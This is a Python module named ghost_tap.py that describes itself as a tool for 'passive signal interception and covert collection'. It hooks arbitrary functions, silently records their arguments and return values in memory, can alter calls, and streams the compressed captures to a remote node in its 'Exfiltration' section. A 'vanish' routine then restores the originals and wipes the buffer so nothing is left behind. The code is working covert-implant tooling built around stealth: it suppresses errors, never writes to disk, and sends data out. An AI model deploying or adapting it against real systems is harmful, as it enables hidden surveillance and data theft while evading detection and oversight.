"""
ghost_tap.py — Passive signal interception and covert collection.

Deploy taps on any callable. Captured signals buffer in-memory.
Drain to a remote node over jump_protocol when ready.
Leaves no trace on revert.

    tap = GhostTap()
    tap.install("target_mod.secret_func", target_module, "secret_func")
    # ... target code runs, signals are silently captured ...
    tap.drain_to(jump_connection)
    tap.vanish()
"""

from __future__ import annotations

import time
import json
import gzip
import hashlib
import threading
from collections import deque
from dataclasses import dataclass, field, asdict
from typing import Any, Callable, Dict, List, Optional, Deque

from mirror_blend import MirrorRegistry, Blender, AdaptiveWrapper
from jump_protocol import JumpConnection, MsgType, CHUNK_SIZE


__all__ = ["GhostTap", "Signal", "TapPoint", "SignalBuffer"]


# ─── Data Structures ────────────────────────────────────────────────────────

@dataclass
class Signal:
    """A single intercepted call."""
    tap_name: str
    timestamp: float
    args_repr: str
    kwargs_repr: str
    return_repr: str
    duration_us: float  # microseconds
    call_seq: int       # monotonic sequence within this tap

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class TapPoint:
    """Tracks a single hooked callable and its capture state."""
    name: str
    target_module: Any
    attr_name: str
    blend_key: Optional[str] = None
    call_count: int = 0
    active: bool = False


class SignalBuffer:
    """Thread-safe bounded ring buffer for captured signals.

    When capacity is reached, oldest signals are silently dropped.
    Nothing touches disk.
    """

    def __init__(self, capacity: int = 10_000):
        self._capacity = capacity
        self._buf: Deque[Signal] = deque(maxlen=capacity)
        self._lock = threading.Lock()
        self._total_captured: int = 0
        self._total_dropped: int = 0

    @property
    def count(self) -> int:
        with self._lock:
            return len(self._buf)

    @property
    def total_captured(self) -> int:
        with self._lock:
            return self._total_captured

    @property
    def total_dropped(self) -> int:
        with self._lock:
            return self._total_dropped

    def push(self, signal: Signal) -> None:
        with self._lock:
            if len(self._buf) == self._capacity:
                self._total_dropped += 1
            self._buf.append(signal)
            self._total_captured += 1

    def drain(self) -> List[Signal]:
        """Pull all signals out. Buffer is empty after this."""
        with self._lock:
            signals = list(self._buf)
            self._buf.clear()
            return signals

    def peek(self, n: int = 10) -> List[Signal]:
        """View last N signals without removing them."""
        with self._lock:
            return list(self._buf)[-n:]

    def clear(self) -> int:
        """Wipe buffer. Returns count of signals destroyed."""
        with self._lock:
            count = len(self._buf)
            self._buf.clear()
            return count


# ─── Core ────────────────────────────────────────────────────────────────────

class GhostTap:
    """Silent function interception layer.

    Uses mirror_blend to hook callables, captures arguments and return values
    into an in-memory buffer, and can drain collected signals over an encrypted
    jump_protocol connection.

    The hooked functions behave identically — tap is observation-only by default.
    For active interception (argument/return modification), supply a custom
    transform via install().
    """

    def __init__(self, buffer_capacity: int = 10_000, quiet: bool = True):
        self._registry = MirrorRegistry()
        self._blender = Blender(self._registry)
        self._buffer = SignalBuffer(capacity=buffer_capacity)
        self._taps: Dict[str, TapPoint] = {}
        self._lock = threading.Lock()
        self._quiet = quiet  # suppress any internal errors silently
        self._active = False
        self._seq_counter = 0
        self._seq_lock = threading.Lock()

    def _next_seq(self) -> int:
        with self._seq_lock:
            self._seq_counter += 1
            return self._seq_counter

    # ── Installation ─────────────────────────────────────────────────────────

    def install(
        self,
        tap_name: str,
        target_module: Any,
        attr_name: str,
        transform_args: Optional[Callable] = None,
        transform_return: Optional[Callable] = None,
        depth: int = 0,
    ) -> bool:
        """Hook a callable and begin collecting signals.

        Args:
            tap_name: Human-readable label for this tap point.
            target_module: The module/object containing the target.
            attr_name: Attribute name on target_module to hook.
            transform_args: Optional (args, kwargs) -> (args, kwargs) mutator.
                            If None, arguments pass through untouched.
            transform_return: Optional (result) -> result mutator.
                              If None, return value passes through untouched.
            depth: Reserved for future call-chain depth tracking.

        Returns:
            True if tap was installed successfully.
        """
        with self._lock:
            if tap_name in self._taps:
                return False

            original = getattr(target_module, attr_name, None)
            if original is None:
                return False

            tap = TapPoint(
                name=tap_name,
                target_module=target_module,
                attr_name=attr_name,
            )

            # Build pre-hook: signature is pre(fn, args, kwargs)
            # Return (args, kwargs) to override, or None to pass through
            def _pre_hook(fn, args, kwargs):
                tap._call_start = time.perf_counter()
                tap._call_args = args
                tap._call_kwargs = kwargs
                if transform_args:
                    try:
                        return transform_args(args, kwargs)
                    except Exception:
                        if not self._quiet:
                            raise
                return None  # no override

            # Build post-hook: signature is post(fn, result)
            # Return value to replace result, or None to pass through
            def _post_hook(fn, result):
                elapsed = (time.perf_counter() - getattr(tap, '_call_start', 0)) * 1_000_000
                seq = self._next_seq()
                tap.call_count += 1

                # Capture the signal
                try:
                    sig = Signal(
                        tap_name=tap_name,
                        timestamp=time.time(),
                        args_repr=_safe_repr(getattr(tap, '_call_args', ())),
                        kwargs_repr=_safe_repr(getattr(tap, '_call_kwargs', {})),
                        return_repr=_safe_repr(result),
                        duration_us=round(elapsed, 1),
                        call_seq=seq,
                    )
                    self._buffer.push(sig)
                except Exception:
                    if not self._quiet:
                        raise

                if transform_return:
                    try:
                        return transform_return(result)
                    except Exception:
                        if not self._quiet:
                            raise
                return None  # no replacement

            try:
                mirror = self._registry.mirror(original, pre=_pre_hook, post=_post_hook)
                blend_key = self._blender.blend_into_module(
                    target_module, attr_name, mirror
                )
                tap.blend_key = blend_key
                tap.active = True
                self._taps[tap_name] = tap
                self._active = True
                return True
            except Exception:
                if not self._quiet:
                    raise
                return False

    def remove(self, tap_name: str) -> bool:
        """Remove a single tap. Target callable is restored."""
        with self._lock:
            tap = self._taps.pop(tap_name, None)
            if tap is None:
                return False
            if tap.blend_key:
                try:
                    self._blender.revert(tap.blend_key)
                except Exception:
                    if not self._quiet:
                        raise
            tap.active = False
            return True

    # ── Collection ───────────────────────────────────────────────────────────

    @property
    def signal_count(self) -> int:
        return self._buffer.count

    @property
    def stats(self) -> dict:
        """Current collection statistics."""
        with self._lock:
            return {
                "active_taps": sum(1 for t in self._taps.values() if t.active),
                "total_taps_installed": len(self._taps),
                "signals_buffered": self._buffer.count,
                "signals_captured_total": self._buffer.total_captured,
                "signals_dropped": self._buffer.total_dropped,
                "tap_details": {
                    name: {
                        "calls": tap.call_count,
                        "active": tap.active,
                        "target": f"{tap.target_module.__name__}.{tap.attr_name}"
                        if hasattr(tap.target_module, '__name__') else tap.attr_name,
                    }
                    for name, tap in self._taps.items()
                },
            }

    def peek(self, n: int = 10) -> List[Signal]:
        """View recent signals without draining."""
        return self._buffer.peek(n)

    def drain(self) -> List[Signal]:
        """Pull all buffered signals. Buffer is empty after."""
        return self._buffer.drain()

    # ── Exfiltration ─────────────────────────────────────────────────────────

    def drain_to(self, conn: JumpConnection, label: str = "ghost_tap") -> int:
        """Send all buffered signals over an encrypted jump connection.

        Signals are serialized as compressed JSON chunks. The buffer is
        cleared after successful transmission.

        Args:
            conn: An established JumpConnection (already handshaked).
            label: Identifier tag for this drain batch.

        Returns:
            Number of signals transmitted.
        """
        signals = self.drain()
        if not signals:
            return 0

        payload = {
            "label": label,
            "drain_time": time.time(),
            "count": len(signals),
            "signals": [s.to_dict() for s in signals],
            "stats": self.stats,
        }

        raw = gzip.compress(json.dumps(payload).encode())
        checksum = hashlib.sha256(raw).hexdigest()

        # Send metadata
        meta = {
            "type": "ghost_tap_drain",
            "label": label,
            "count": len(signals),
            "size": len(raw),
            "checksum": checksum,
        }
        conn.send_json(MsgType.SESSION_DATA, meta)

        # Stream compressed payload in chunks
        offset = 0
        while offset < len(raw):
            chunk = raw[offset:offset + CHUNK_SIZE]
            conn.send(MsgType.FILE_CHUNK, chunk)
            offset += len(chunk)

        return len(signals)

    def drain_to_bytes(self, label: str = "ghost_tap") -> Optional[bytes]:
        """Drain signals to compressed bytes for manual transport.

        Returns gzip-compressed JSON, or None if buffer is empty.
        """
        signals = self.drain()
        if not signals:
            return None

        payload = {
            "label": label,
            "drain_time": time.time(),
            "count": len(signals),
            "signals": [s.to_dict() for s in signals],
        }
        return gzip.compress(json.dumps(payload).encode())

    # ── Cleanup ──────────────────────────────────────────────────────────────

    def vanish(self) -> dict:
        """Remove all taps, wipe buffer, restore all originals.

        Returns stats at time of teardown for operator review.
        """
        final_stats = self.stats
        with self._lock:
            # Revert all blends (restores originals)
            try:
                self._blender.revert_all()
            except Exception:
                if not self._quiet:
                    raise

            # Mark all taps dead
            for tap in self._taps.values():
                tap.active = False
            self._taps.clear()

        # Wipe signal buffer
        self._buffer.clear()
        self._active = False
        return final_stats

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.vanish()

    def __repr__(self):
        return (
            f"<GhostTap taps={len(self._taps)} "
            f"buffered={self._buffer.count} "
            f"captured={self._buffer.total_captured}>"
        )


# ─── Helpers ─────────────────────────────────────────────────────────────────

def _safe_repr(obj: Any, max_len: int = 200) -> str:
    """Repr that never raises and truncates long output."""
    try:
        r = repr(obj)
        if len(r) > max_len:
            return r[:max_len - 3] + "..."
        return r
    except Exception:
        return "<repr-failed>"


# ─── Standalone Quick-Deploy ─────────────────────────────────────────────────

def quick_tap(
    target_module: Any,
    func_names: List[str],
    buffer_capacity: int = 10_000,
) -> GhostTap:
    """One-liner deployment: tap multiple functions on a module.

    Usage:
        tap = quick_tap(some_module, ["func_a", "func_b"])
        # ... code runs ...
        signals = tap.drain()
        tap.vanish()
    """
    gt = GhostTap(buffer_capacity=buffer_capacity)
    for name in func_names:
        gt.install(
            tap_name=f"{target_module.__name__}.{name}" if hasattr(target_module, '__name__') else name,
            target_module=target_module,
            attr_name=name,
        )
    return gt
